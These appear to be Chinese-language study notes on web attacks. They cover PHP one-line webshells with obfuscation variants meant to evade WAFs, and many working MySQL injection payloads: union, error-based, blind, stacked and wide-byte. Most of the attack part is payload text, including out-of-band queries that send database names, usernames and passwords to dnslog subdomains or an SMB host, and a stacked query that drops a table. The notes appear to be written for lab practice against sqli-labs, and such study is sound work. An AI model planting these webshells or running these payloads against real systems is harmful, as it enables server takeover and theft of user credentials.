

# Webshell

### 1. 什么是 WebShell？

WebShell 是一种以网页文件形式存在的命令执行环境，通常以 ASP、PHP、JSP 或 CGI 等动态脚本语言编写。攻击者通过 WebShell 获得服务器的控制权限，可以执行任意命令、读取文件、上传恶意文件等。它通常被称为网站的“后门”，用于维持对受感染服务器的长期控制。

### 2. WebShell 的分类

WebShell 通常分为以下几类：

1. **一句话 WebShell**：非常短小的恶意代码，通常只包含一行，功能是执行任意命令或代码。
2. **复杂 WebShell**：带有文件管理、数据库管理等功能的恶意脚本，通常以多行代码形式存在，功能强大。
3. **隐蔽型 WebShell**：通过各种技术手段对代码进行混淆或加密，以规避安全检测工具的发现。

### 3. 一句话 WebShell 示例

一句话 WebShell 通常非常简短，仅包含执行代码的核心功能。

#### PHP 一句话 WebShell 示例

```php
<?php eval($_REQUEST["cmd"]); ?>
```

- **解释**：`eval()` 函数将 `$_REQUEST["cmd"]` 的内容作为 PHP 代码执行，攻击者通过请求传递命令（如 `cmd=phpinfo()`），服务器执行该命令。

```php
<?php assert($_REQUEST['cmd']); ?>
```

- **解释**：`assert()` 函数将 `$_REQUEST["cmd"]` 的内容当作 PHP 代码执行，功能类似于 `eval()`。

### 4. WebShell 代码执行函数

在 PHP 中，有许多函数可以执行代码，这些函数通常被用于编写 WebShell。

#### 常见代码执行函数：

- **`eval()`**：执行字符串形式的 PHP 代码。
- **`assert()`**：与 `eval()` 类似，执行字符串形式的 PHP 代码。
- **`preg_replace()`**：带 `/e` 修饰符的情况下，可以将替换内容作为 PHP 代码执行。
- **`create_function()`**：创建匿名函数，并可以执行传递的代码。
- **`system()`、`exec()`、`shell_exec()`**：直接在服务器上执行系统命令。

```php
// 使用 eval() 执行任意代码
<?php eval($_REQUEST['cmd']); ?>

// 使用 assert() 执行任意代码
<?php assert($_REQUEST['cmd']); ?>

// 使用 preg_replace() 和 /e 修饰符
<?php preg_replace("/abc/e", $_REQUEST['cmd'], "abc"); ?>

// 使用 create_function() 创建并执行匿名函数
<?php 
$func = create_function('', $_REQUEST['cmd']);
$func();
?>
```

### 5. WebShell 变形技术

为了绕过防火墙（WAF）和安全检测，WebShell 往往会使用各种技术手段进行变形和混淆。

#### 5.1 利用字符串连接和替换

**示例**：

```php
<?php
$str1 = "as";
$str2 = "sert";
$func = $str1 . $str2; // $func = "assert"
$func($_REQUEST['cmd']); // 相当于执行 assert($_REQUEST['cmd'])
?>
```

#### 5.2 利用 Base64 编码

**示例**：

```php
<?php
$code = base64_decode("YXNzZXJ0"); // "assert" 的 Base64 编码
$code($_REQUEST['cmd']); // 相当于执行 assert($_REQUEST['cmd'])
?>
```

#### 5.3 利用替代数据来源

**示例**：

```php
<?php
$_REQUEST['a']($_REQUEST['cmd']); // 请求参数 a 的值可以是 assert、eval 等函数名
?>
```

#### 5.4 利用异或运算

**示例**：

```php
<?php
$func = chr(97) ^ chr(2); // 'a' 异或 2
$func .= chr(115) ^ chr(5); // 's' 异或 5
$func .= chr(115) ^ chr(5); // 's' 异或 5
$func .= chr(101) ^ chr(1); // 'e' 异或 1
$func .= chr(114) ^ chr(0); // 'r' 异或 0
$func .= chr(116) ^ chr(5); // 't' 异或 5
$func($_REQUEST['cmd']); // 相当于执行 assert($_REQUEST['cmd'])
?>
```

### 6. WebShell 管理工具

常见的 WebShell 管理工具包括：

- **蚁剑 (AntSword)**：开源、跨平台的 WebShell 管理工具。
- **C刀 (Cknife)**：跨平台的中国菜刀变种。
- **冰蝎 (Behinder)**：支持动态加密的 WebShell 管理工具，功能强大。
- **哥斯拉 (Godzilla)**：功能丰富，支持虚拟终端、数据库管理等。

这些工具通过连接 WebShell，提供图形化界面，方便攻击者执行命令、管理文件、操作数据库等。

`assert` 和 `eval` 都可以在 PHP 中执行字符串形式的代码，但它们的用途和行为略有不同：

### 7. `eval` 函数

- **作用**：`eval` 函数直接执行传入的字符串作为 PHP 代码。它可以执行任意合法的 PHP 代码，包括变量声明、函数调用、控制结构（如 if、for 循环）等。
- **返回值**：如果字符串的代码执行成功，`eval` 返回 `null`；如果代码执行中出现错误，`eval` 会抛出一个解析错误（Parse Error）。
- **典型用途**：一般用于动态执行用户输入或动态生成的 PHP 代码（尽管这通常是不安全的）。

```php
<?php
$code = 'echo "Hello, World!";';
eval($code); // 输出: Hello, World!
```

### 8. `assert` 函数

- **作用**：`assert` 函数最初用于调试和测试，检查一个条件是否为真。如果传入的是一个字符串，`assert` 会将其视为 PHP 代码并执行；如果条件为假，则会触发错误（可以是警告、异常等，具体取决于 PHP 配置）。
- **返回值**：`assert` 的返回值通常与传入条件的真假相关。如果是表达式，会返回表达式的值；如果是字符串代码，会尝试执行并返回结果。
- **典型用途**：主要用于断言（assertion），即在开发或测试阶段用于验证条件是否成立。然而，`assert` 的字符串执行功能也常被滥用，如在 WebShell 中。

```php
<?php
assert('1 === 1'); // 不输出任何内容，因为条件为真
assert('1 === 2'); // 触发一个警告，条件为假

$code = 'echo "Hello, World!";';
assert($code); // 输出: Hello, World!
```

### 9. 区别总结

- **主要用途**：`eval` 用于直接执行任意 PHP 代码，而 `assert` 用于断言条件是否为真，但也可以执行字符串代码。
- **执行机制**：`eval` 只会执行代码，而 `assert` 是在检查条件的同时，如果传入字符串会执行代码。
- **错误处理**：`eval` 会抛出解析错误（Parse Error），而 `assert` 会触发断言失败的错误，默认情况下是一个警告（但可以配置为抛出异常）。

------

# Mysql

# SQL注入

| 注入类型         | 描述                                                         | 示例                                                         | 主要目的                   |
| ---------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------------------------- |
| **联合查询注入** | 利用`UNION`将额外查询结果与原查询合并，获取更多数据。        | `' UNION SELECT null, username, password FROM users --+`     | 提取额外数据               |
| **报错注入**     | 通过数据库返回的错误信息获取敏感数据或数据库结构信息。       | `' OR 1=1 --+`                                               | 获取数据库结构或数据       |
| **布尔盲注**     | 通过构造查询条件，观察页面响应是否变化，推测数据。           | `' AND 1=1 --` vs `' AND 1=2 --+`                            | 推测数据库内容             |
| **时间盲注**     | 通过引入时间延迟，观察响应时间来判断条件是否成立。           | `' AND IF(1=1, SLEEP(5), 0) --+`                             | 推测数据或验证条件         |
| **数据外带**     | 从一个查询中提取数据，并注入到另一个查询中，通常用于进一步攻击。 | `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) --+` | 获取和利用外部数据         |
| **宽字节注入**   | 通过利用字符编码漏洞注入恶意代码。                           | `' OR 1=1 --+`（可能被编码为宽字节）                         | 绕过输入过滤器             |
| **HTTP头注入**   | 在HTTP头中注入恶意代码，可能用于HTTP响应拆分攻击。           | `Header: value/r/nInjected-Header: value`                    | 影响HTTP响应或利用信息泄露 |
| **二次编码注入** | 利用二次编码（如URL编码）绕过过滤器并注入恶意代码。          | `%27%20OR%201%3D1%20--+`                                     | 绕过输入验证               |
| **Base64注入**   | 利用Base64编码来绕过检测，并注入恶意代码。                   | `' OR 1=1 --+`（Base64编码为`JycgT1IgMT0xIC0t`）             | 绕过输入过滤器             |
| **堆叠注入**     | 在一个查询中执行多个SQL命令，通常通过分号分隔。              | `'; DROP TABLE users; --+`                                   | 执行多个SQL命令            |
| **二次注入**     | 在系统的某个地方注入恶意代码，稍后在另一个地方执行。         | 用户注册时注入的代码存储在数据库中，后续在其他地方执行       | 通过存储型注入执行恶意操作 |

### 介绍

- 攻击者将`精心构造的payload`,传递给数据库,数据库`没有严格过滤`直接执行,导致数据库信息被泄露,篡改或者破坏

- 危害:获取数据库存储的`数据`,获取网站的`控制权限`,获取服务器的控制权限,网站挂马

- 产生原因:不当的`类型处理`,不安全的`数据库配置`,不合理的`查询集处理`,不当的错误处理,转义字符处理不合适,多个提交处理不当

- 2个关键条件:用户能`控制输入`的内容,web应用把用户输入的内容,在没经过`过滤`或者`严格筛选`的情况下带入到数据库执行

- 分类:

  - 请求方式

    ```sql
    //GET方式请求注入
    //通常显示在url中,注入点通常出现在url的查询字符串部分
    http://example.com/page?id=1'or '1'='1
    ```

    ```sql
    //POST方式请求注入
    //通过http请求的主体传递,注入点通常在请求体中,不会在url中显示
    POST /login HTTP/1.1
    Host:example.com
    Content-Type:application/x-www-form-urlencoded
    username=admin'--&password=anything
    ```

  - 注入点参数

    ```sql
    //整数型注入
    select name,password,uid from users where uid=$id
    
    //字符型注入
    select name,password,uid from users where uid='$id'
    
    //搜索型注入
    select name,password,uid from users where name like "%$uname%"了;
    ```

  - 注入点反馈类型

    - 1.联合查询-->`union`类型
    - 2.报错注入-->基于错误显示
    - 3.布尔盲注-->布尔类型
    - 4.时间盲注-->基于时间
    - 5.其它注入-->宽字节注入,`header`注入,`base64`,`url`注入,二次注入,堆叠注入

  - 万能密码

    - 原理:使用`构造方式`绕过参数验证
    - 危害:可以在不知道用户密码的情况下,登录到`任意账户`,包括`管理员账户`

### 手工注入

- 适用情况:在`自动化工具无法起作用`或者`情况复杂`时使用

- 流程:判断漏洞

- ```
  //判断是否有注入漏洞
  
  通过注释["--","#"],闭合[']方式
  通过在参数之间使用add,or来对输入进行判断,是否有语句执行
  '1 and 1=1 --+ //正常显示
  '1 and 1=2 --+ //错误显示
  说明存在注入漏洞
  ```

- 识别注入点类型

- ```
  //获取数据库基本信息(数据库版本[version()],数据库类型,回显数据列数等)
  ?id=-1' order by 10 --+ //使用order by [字段数] 查询出字段数
  ?id=-1' union select 1,2,3 --+ //使用union联合查询,找出字段对应输出位置
  
  可以使用内置函数uesr(),version()等在占位符获取数据库信息
  ```

- 获取`数据库名`,`表名`,`列名`,`用户数据`

- 破解加密数据

- 提升权限

- 内网渗透

### 联合查询

- 定义:使用`拼接联合方式`将2组或多组关键值`拼凑起来`进行查询

- 使用:多条查询语句的`查询列数和数据类型必须一致`,union关键字`默认去重`,如果使用union all 可以包含重复项

- 前提:页面必须要有`显示位`

- 流程:

- ```sql
  //判断注入点
  1 and 1=1 --+	//整型注入点
  1 and 1=2 --+ 	//整型注入点
  1'or '1'='1		//字符型注入点
  1'or '1'='2		//字符型注入点
  
  //判断列数,使用order by判断字段数(二分法)
  1'order by 1 --+ 
  1'order by n --+
  1'or 1=1 order by n --+ 
  
  //将多条查询语句结果合并成一个结果集
  查询语句1
  union
  查询语句2
  union
  查询语句3
  
  //判断显示位
  1'union select 1,2 --+
  -1'union select 1,2 --+		//使用-1来使union前半语句无查询返回值
  
  //查看数据库信息
  user()	//返回当前使用数据库的用户
  version() //返回当前数据库版本
  database() //返回当前使用的数据库名字
  
  //查看表及列名(系统内置数据库information_schema存储其它所有数据库信息)
  schema表:存放所有数据库中的表信息
  tables表:存储数据库中的表信息
  columns表:存储数据库中的列信息,包括表有多少列
  
  //显示所有数据库的信息并显示数据库名
  -1'union select schema_name,2 from information_schema.schemata --+
  
  -1'union select database(),2#
  
  //获取数据库为 liuyanban 的所有信息并显示表名
  -1'union select table_name,column_name from information_schema.tables where table_schema='liuyanban' --+
  
  //选取数据库为 liuyanban 表为 liuyan 的所有字段并显示表名和字段名
  -1'union select table_name,column_name from information_schema.columns where table_schema='liuyanban' and table_name='liuyan' --+
  ```

- 字符串拼接

- ```sql
  //concat(),将多个字符串链接成为一个字符串
  -1'union select 1,concat(id,email_id),3 from emails --+
  
  //concat_ws(),将多个字符串连接成一个字符串,可以指定分割符
  -1'union select 1,concat_ws('_',id,email_id),3 from emails --+
  
  //group_concat(),将多行结果连接成一组
  -1'union select 1,group_concat(email_id),3 from emails --+
  ```

- 获取详细信息

- ```sql
  1'union select 1,concat(usermpassword) from users --+
  1'union select 1,concat_ws("_",user,password) from users --+
  
  //获取数据库列表
  -1'union select schema_name,2 from information_schema.schemata --+
  
  //获取指定表
  -1'union select table_schema,table_name from information_schema.tables where table_schema='stu_manage' and table_name='admin' --+
  
  //获取表的字段信息
  -1'union select table_name,column_name from information_schema.columns where table_schema='stu_manage' and table_name='admin' --+
  
  //获取字段内容
  -1'union select 1,concat_ws("_",username,password) from admin --+
  ```

### 报错注入

- 概念:利用数据库的某些机制,人为的制造出错误条件,使得查询结果能够出现在报错信息中,想办法让错误信息中可以显示数据库的内容

- 基本手法

- ```sql
  //extractvalue(arg1,arg2)-->arg1:xml文档,arg2:xpath语句,至少接收两个参数
  //mysql5.1以上
  
  1'and extractvalue(1,concat(0x3a,user(),0x3a) --+
  
  //在报错信息中查询出
  1'and extractvalue(1,arg2) --+
  arg2=concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a)
  ```

- ```sql
  //update(arg1,arg2,arg3),arg1为xml文档,arg2为指定位置的xpath字符串,arg3为string格式的新值
  
  1'and updatexml(1,concat(0x3a,(select user()),0x3a),1) --+
  
  1'and updatexml(1,arg2,1)--+
  arg2=concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a)
  ```

- ```
  //floor,返回向下取整的整数,只返回arg1的整数部分
  
  1'and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) --+
  
  1'and (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) --+
  ```

- `floor()`报错准确的说是`floor`,`count`,`group by`冲突报错,`count(*)`,`rand()`,`group by`三者缺一不可

- ```sql
  1'and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
  ```

- ```SQL
  floor():向下取整
  rand():在0-1产生一个随机数
  floor(rand()*2):对生成的0-2直接按的随机数进行向下取整,2条记录可能报错
  floor(rand(0)*2):记录需要为3条以上,且三条以上必报错
  count(*):统计记录条数,包括null值
  group by:对数据进行分组,存在则count(*)+1,不存在则在虚拟表中插入一条数据	
  ```

- 其它报错注入

- ```sql
  //name_const,支持mysql5.0不支持5.1
  //name_const(name,value),当用来产生一个结果集合时,name_const()促使该列时使用给定名称
  
  1'and (select * from (select name_const(version(),1),name_const(version(),1))a) --+
  ```

- ```sql
  //整型溢出exp,mysql低于5.5.5
  //exp是以e为底的指数函数,由于数字太大会溢出,该函数会在参数大于709是溢出,产生报错
  
  //只有mysql5.5.29才能正常显示
  1'and exp(~(select*from(select version())a)) --+
  ```

- ```sql
  //几何函数,高版本的mysql无法得到数据,目前只有mysql5.5.29和5.1.60能得到正确输出
  geometrycollection(),multpoint(),polygon(),multipolygon(),linestring(),multilinestring()
  
  1' and
  	(select multipoint(
  		(select * from
  			(select * from
  				(select * from
  					(select version())a
  					)b
  				)c
  			)
  		)
  	) -- qwe
  ```

- ```sql
  //json报错,获取json值的类型,当我们传入的值不属于json格式时则报错
  //json_type(version())
  1'and json_type(version())%23 --+
  
  //json_extract(json_doc,path[,path]) --+
  //从json_doc中读取数据,和path的参数匹配,第一个或第二个参数不是json格式就会报错
  1'and json_extract(user(),'$.a') --+
  1'and json_extract('[1,2,3]',user()) --+
  
  //json_arary_append(json_doc,path,val[,path,val]...),
  //将值附加到json文档中指定数组的末尾并返回结果
  //报错输出原理和 json_extract函数相同
  ```

  

### 基本步骤

- 查看数据库版本

```sql
1'and extractvalue(1,concat(0x3a,(select version()),0x3a)) --+
```

- 查看数据库名字

```sql
1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
```

- 查看数据库表

```sql
1' and extractvalue(1,concat(0x7e,(select count(table_name) from
information_schema.tables where table_schema=database()),0x7e)) --+
```

- 查看数据库有哪些表

```sql
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from
information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+
```

- 查看表中的字段名

```sql
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from
information_schema.columns where table_schema=database() and table_name='emails'
limit 0,1),0x7e)) --+
```

- 查看表里的数据

```sql
1' and extractvalue(1,concat(0x7e,(select
group_concat(concat_ws('___',id,email_id)) from information_schema.columns where
table_schema=database() and talbe_name='emails' limit 0,1),0x7e)) --+
```

### sql盲注

- 概念:服务器不会直接返回具体的数据库,只会返回程序开发所设定的特定信息
- 页面`不会直接显示`sql执行的结果

### 布尔盲注

- ```sql
  //布尔盲注:在进行sql注入时,web页面只返回True和False
  //通过对返回对返回True或False的情况对数据库的信息进行猜解
  
  //相关函数:substr(),substring(),mid()
  //用于长度截取某一列字段的一部分,在各个数据库中的名称不一样
  //substr(arg1,int1,int2)，int1为截取开始位置(从1开始计算)，int2为截取长度，其余用法完全一样
  1. substr()
  2. substring()
  3. mid()
  select substr(database(),1,3)
  
  //select length(database())-->获取数据库长度
  //select asicc('a')-->将单一字符转化成ascii码
  //条件判断:select if(length(database())>0,1,0)
  ```

- ```sql
  //使用步骤
  
  ①获取数据库名长度
  1' and (length(database()))=n --+ //n为数据库名长度
  
  ②获取数据库名称
  1' and (ascii(substr(database(),n,1))=m) --+ //n为第几个位置，m为ascii码
  [65,122]
  
  ③获取表名长度
  1' and (length((select table_name from information_schema.tables where
  table_schema=database() limit 0,1))=m) --+
  //m为表名长度
  //获取表的个数
  1' and (select count(*) from information_schema.tables where
  table_schema=database())=m -- qwe //m为表的个数
  
  ④获取表名
  1' and (ascii(substr((select table_name from information_schema.tables where
  table_schema=database() limit 0,1),n,1))=m) --+ //n为表名的第几个位置，m为
  ascii范围[65,122]
  
  ⑤获取字段长度
  1' and (length((select column_name from information_schema.columns where
  table_schema=database() and table_name='表名' limit 0,1))=m) --+ //m为字段名长度
  //获取字段个数
  1' and ((select count(*) from information_schema.columns where
  table_schema=database() and table_name='表名')=m) --+ //m为表的个数
  
  ⑥获取字段名
  1' and (ascii(substr((select column_name from information_schema.columns where
  table_schema=database() and table_name='表名' limit 0,1),n,1))=m) --+ //n为字
  段名的位置，m为ascii范围[65,122]
  
  ⑦获取数据
  select 字段 from 表时间盲注
  ```

### 时间盲注

- ```sql
  //时间盲注
  //sleep()
  select if(1=1,sleep(10),0)
  
  //benchmark(arg1,arg2)-->arg1是执行次数,arg2是执行的表达式
  select if(1=1,benchmark(5000000,md5('abc')),0)
  ```

- ```sql
  //使用步骤
  
  ①获取数据库名长度
  1' and if((length(database()))>5,sleep(10),0) --+
  
  ②获取数据库名称
  1' and if(ascii(substr(database(),m,1))=m,sleep(10),0) --+ //65<=m<=122
  
  ③获取表名长度
  1' and if(exp1,sleep(10),0) --+
  exp1= length((select count(table_name)from information_schema.tables where
  table_schema=database() limit 0,1))
  综上：
  1' and if(length((select table_name from information_schema.tables where
  table_schema=database() limit 0,1))=m,sleep(10),0) --+ //m为表名长度
  
  ④获取表的个数
  1' and if(exp1,sleep(10),0) --+
  exp1= select count(*) from information_schema.tables where
  table_schema=database())=m
  综上:
  1' and if((select count(*) from information_schema.tables where
  table_schema=database())=4,sleep(10),0) --+ //m为表的个数
  
  //获取表名
  1' and if(exp1,sleep(10),0) --+
  exp1= ascii(substr((select table_name from information_schema.tables where
  table_schema=database() limit 0,1),n,1))=m
  综上：
  1' and if(ascii(substr((select table_name from information_schema.tables where
  table_schema=database() limit 0,1),n,1))=m,sleep(10),0) --+ //n为表名的第
  几个位置，m为ascii范围[65,122]
  
  ⑤获取字段长度
  1' and if(length(),sleep(10),0) --+
  exp1= length((select column_name from information_schema.columns where
  table_schema=database() and table_name='表名' limit 0,1))=m
  综上：
  1' and if(length((select column_name from information_schema.columns where
  table_schema=database() and table_name='表名' limit 0,1))=2,sleep(10),0) --+
  //m为字段名长度
  //获取字段个数
  1' and if((select count(*) from information_schema.columns where
  table_schema=database() and table_name='表名')=m,sleep(10),0) --+ //m为表的个数
  
  ⑥获取字段名
  1' and if(exp1,sleep(10),0) --+
  exp1= ascii(substr((select column_name from information_schema.columns where
  table_schema=database() and table_name='表名' limit 0,1),n,1))=m
  综上：
  1' and if(ascii(substr((select column_name from information_schema.columns where
  table_schema=database() and table_name='表名' limit 0,1),n,1))=m,sleep(10),0) --+
  //n为字段名的位置，m为ascii范围[65,122]
  
  ⑦获取数据
  
  ```

### 数据外带

- 概念:如果SQL注入仅能使用**时间盲注**，可以使用**OOB(out of band)**,将sql语句执行的结果以数据的形式外带出来
- 条件:`Windows`操作系统、`mysql`的全局变量`secure_file_priv`不为`null`
- dnslog平台

| **网址**               | 介绍                          |
| ---------------------- | ----------------------------- |
| http://dnslog.cn/      | 仅支持DNS数据外带             |
| http://eyes.sh/        | 支持DNS和HTTP两种数据外带方式 |
| Burpsuite Collaborator | 支持DNS和HTTP两种数据外带方式 |
| ceye.io                | ..........                    |

- 应用场景

| 方式                                  | 简介                  |
| ------------------------------------- | --------------------- |
| secure_file_priv                      | 拥有读写权力          |
| secure_file_priv=""                   | 可以读取任何目录      |
| secure_file_priv='/var/www/html'      | 可以读取指定文件      |
| secure_file_priv=null                 | 不能加载文件          |
| show global variables like '%secure%' | 查看mysql是否有写限制 |

- 有写限制，则打开mysql的配置文件`my.ini`，在`mysqld`一栏添加 `secure_file_priv=""`

- DNS数据外带:

- 在极限条件**(内网机器不出网，支持**dns出网**)，**61长度限制，不支持敏感符号(@#$%)，外带数据需要转码，规避流量监测设备

- SMB数据外带:`默认支持TCP/UDP出网方式时可用，无长度限制和符号限制`，规避流量监测设备

- ```liunx
  //centos7上安装SMB服务
  
  1. 安装smb服务
  yum install samba -y
  2. 修改配置文件
  vim/etc/samba/smb.conf
  3. 修改samba日志路径
  /var/log/samba/log.smbd
  4. 利用实时查看日志并匹配结果
  tail -f /var/log/samba/log.smbd | grep "failed to find service"
  ```

- payload

- ```sql
  1' and load_file(concat('////192.168.172.130//',(select user()),'t'))%23
  1' and load_file(concat('////192.168.172.130//',(select
  group_concat(schema_name) from information_schema.schemata),'t'))%23
  ```

- HTTP数据外带

- ```cmd
  //以DNS数据外带为例
  
  load_file(concat('////',查询内容,'.网址//abc')
  or
  load_file(concat('//',查询内容,'.网址/abc') # /abc指定外部路径
  ```

- ```sql
  //实例
  
  1.获取数据库名
  select * from users where id=1 and load_file(concat('////',(select
  database()),'.54uekpz5.eyes.sh//abc'));
  2.获取表名
  select * from users where id=1 and load_file(concat('////',(select
  group_concat(table_name separator '_') from information_schema.tables where
  table_schema=database()),'.Laffrex.eyes.sh//abc'));
  3.获取字段名
  select * from users where id=1 and load_file(concat('//',(select
  group_concat(column_name separator '_') from information_schema.columns where
  table_schema=database() and table_name='users'),'.Laffrex.eyes.sh/abc'));
  4.获取字段数据
  select * from users where id>0 and load_file(concat('//',(select
  group_concat(concat_ws('_',id,username,password) separator '__') from
  information_schema.columns where table_schema=database() and
  table_name='users'),'.Laffrex.eyes.sh/abc'));
  ```

- 基本步骤

- ```sql
  ①获取数据库名
  1' and load_file(concat('////',(select database()),'.Laffrex.eyes.sh//abc')) --+
  
  ②获取表名
  1' and load_file(concat('////',(select group_concat(table_name separator '_')
  from information_schema.tables where
  table_schema=database()),'.Laffrex.eyes.sh//abc')) --+
  
  ③获取字段名
  1' and load_file(concat('//',(select group_concat(column_name separator '_') from
  information_schema.columns where table_schema=database() and
  table_name='users'),'.Laffrex.eyes.sh/abc')) --+
  
  ④获取字段数据
  
  //获取id
  1' AND load_file(CONCAT('////',(SELECT group_concat(id separator '__') FROM
  users),'.Laffrex.eyes.sh/abc')) --+
  //获取username
  1' AND load_file(CONCAT('////',(SELECT SUBSTRING(group_concat(username separator
  '__'), 1, 60) FROM
  users),'.Laffrex.eyes.sh/abc1')) --+ //本次字符最大长度为63
  1' AND load_file(CONCAT('////',(SELECT SUBSTRING(group_concat(username separator
  '__'), 61, 120) FROM users),'.Laffrex.eyes.sh/abc1')) --+
  1' AND load_file(CONCAT('////',(SELECT
  substring(group_concat(concat_ws('_',id,username,password) separator '__'),1,45)
  FROM users),'.Laffrex.eyes.sh/abc')) --+ //本次字符最大长度45
  ```

### 宽字节注入

- 概念:宽字节是指`2个字节宽度`的编码技术

- 原因:set character_set_client="gbk"

- mysql在使用`GBK`编码时，**符合条件**会认为`2个字符`是`1个汉字`

- 第一个字节`129-254`，第二个字节为`64-254`

- 原理:程序员会对**特殊字符**(例如单引号)进行**正则匹配使其失效**，这时无法使用普通注入

- 方法:

  ```
  //黑盒
  在注入点后键入%df，再开始正常注入
  键入字符的ASCII要大于128，才能和反斜杠 “/” 组合成一个汉字
  
  //白盒
  查看Mysql编码是否为GBK
  是否使用了preg_replace进行正则替换
  是否使用了addslashes()进行转义
  是否使用了mysql_real_escape_string()进行转义
  ```

- 宽字节注入修复

- ```php
  //编码设置
  Mysql_query("SET
  character_set_connection=gbk,character_set_result=gbk,character_set_client=binary
  ",$conn);
  ```

- ```php
  //过滤函数
  mysql_real_escape_string()/addslashes()
  ```

### HTTP头注入

- **常见污染参数**

  ![image-20240825155656203](学习/笔记/assets/image-20240825155656203.png)

- $_SERVER:包含诸多http信息的数组

### 二次编码注入

```sql
-1%2527 union select 1,(select group_concat(table_name) from
information_schema.tables where table_schema=database()),database() -- qwe

-1%2527
```

### Base64注入

```sql
admin') and updatexml(1,concat(0x7e,database(),0x7e),1) -- qwe
base64编码后：
YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSBxd
2U=
```

### 堆叠注入

```sql
//插入数据
1';insert into users(username,password) value('icq','icq') -- qwe
//获取字段名
-1' union select 1,(select group_concat(column_name) from
information_schema.columns where table_schema=database() and
table_name='users'),database() -- qwe
//获取字段内数据
-1' union select 1,(select group_concat(concat_ws('_',username,password)) from
users),database() -- qwe
```

### 二次注入

```sql
1' and updatexml(1,concat(0x7e,database(),0x7e),1)#
1' order by 5#
1' union select 1,2,3,4,5#
1' union select 1,database(),3,4,5#
1' union select 1,(select table_name from information_schema.tables where
table_schema=database()),2,3,4,5#
1' union select 1,user(),3,4,5#

select * from users where id= {id}
select * from users where id= '1' and select database()'
id= 1 and 1=1 --+
id= 1 and 1=2 --+
```



### 使用 `information_schema` 数据库

```sql
USE information_schema;
```

### 查看 `information_schema` 数据库中的所有表

```sql
SHOW TABLES;
```

### 查看所有表中的所有字段

```sql
SELECT column_name FROM information_schema.columns;
```

### 查询 `msgboard` 表中的所有字段

```sql
SELECT COLUMN_NAME 
FROM information_schema.COLUMNS 
WHERE TABLE_NAME = 'msgboard';
```

### 使用 `concat()` 函数拼接多个字符串

```sql
SELECT CONCAT('M', 'y', 'S', 'Q', 'L');
```

结果：

```text
+-----------------------------+
| concat('M','y','S','Q','L') |
+-----------------------------+
| MySQL                       |
+-----------------------------+
```

### 使用 `concat_ws()` 函数拼接多个字符串

```sql
SELECT CONCAT_WS('', 'M', 'y', 'S', 'Q', 'L');
```

结果：

```text
+-----------------------------------+
| concat_ws('','M','y','S','Q','L') |
+-----------------------------------+
| MySQL                             |
+-----------------------------------+
```

### 使用 `group_concat()` 函数将多行连接成一组

```sql
SELECT GROUP_CONCAT(actor) 
FROM moviesdata.allmovies;
```

### SQL 注入示例

```sql
1'union select 1,table_name from information_schema.tables where table_schema='msgboard' -- qwe
```

# SQL注入技巧与示例

## 1. 基于报错的SQL注入

### 1.1 使用 `extractvalue` 提取表名

```sql
http://192.168.77.131/master/Less-1/?id=1' and (extractvalue(1, concat(0x3a, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x3a))) --+
```

- **`updatexml(arg1, arg2, arg3)`** 和 **`extractvalue(arg1, arg2)`** 可以用于报错注入。

- **`arg2` 参数：**

  ```sql
  concat(0x3a, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x3a)
  ```

- 最终的payload

  ```sql
  http://192.168.77.131/master/Less-1/?id=1'and extractvalue(arg1,arg2)
  
  http://192.168.77.131/master/Less-1/?id=1'and (extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))) --+
  ```

  以上代码用于在页面中显示当前数据库中的所有表名。

### 1.2 使用 `floor` 函数进行报错注入

- **解释:**``floor报错注入``准确的说应该是``floor``,``count``,``group by``冲突报错,``count(*)``,三者缺一不可

- **示例公式：**

  ```sql
  and select 1 from (select count(*), concat(database(), floor(rand(0)*2)) x from information_schema.tables group by x) a
  ```

- **关键函数解析：**

  - **`floor()`**：取整函数
  - **`rand()`**：生成0和1之间的随机数
  - **`floor(rand(0)*2)`**：当记录数大于等于3时，必定报错且返回值有规律

### 1.3 详细解释

1. **`floor(rand()*2)` 随机输出0或1，有两条记录时可能会报错：**

   - **`rand()`**：生成0和1之间的随机数
   - **`floor(rand()*2)`**：乘以2后取整，结果只能是0或1

   由于`rand()`生成的随机数不同，可能会导致`group by`查询中出现两个不同的分组值，从而引发报错。

2. **`floor(rand(0)*2)` 记录需为3条以上，且3条以上必报错，返回值有规律：**

   - 使用种子为0的`rand(0)`函数，每次调用都会产生相同的随机数，导致所有记录的分组键相同，从而在`group by`时触发报错。

## 2. 布尔盲注

### 2.1 获取数据库名称

1. 判断数据库名长度为8：

   ```sql
   http://192.168.77.131/master/Less-1/?id=1' and (length(database()))=8 --+
   ```

2. 逐个字符猜测数据库名，最后得出数据库名为 `security`。

### 2.2 获取数据库表名

1. 获取当前数据库中的表数量：

   ```sql
   http://192.168.77.131/master/Less-1/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4 --+
   ```

2. 获取第一个表名：

   ```sql
   select table_name from information_schema.tables where table_schema=database() limit 1,1;
   
   substr(表名,1,1)> < = ascii
   ```

   使用`limit`和`substr`逐字猜解表名。

3. 获取数据

   

## 3. 时间盲注

### 3.1 基于时间的盲注示例

- 如果数据库名长度大于0，则延迟10秒：

  ```sql
  if(length(database())>0, sleep(10), 1)
  ```

- 逐字猜测表名并延迟响应时间：

  ```sql
  if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))=100, sleep(10), 1)
  ```

### 报错注入

- 获取数据库名(security)

```sql
http://192.168.77.131/master/Less-1/?id=1'and extractvalue(1,concat(0x3a,(select database()),0x3a)) --+
```

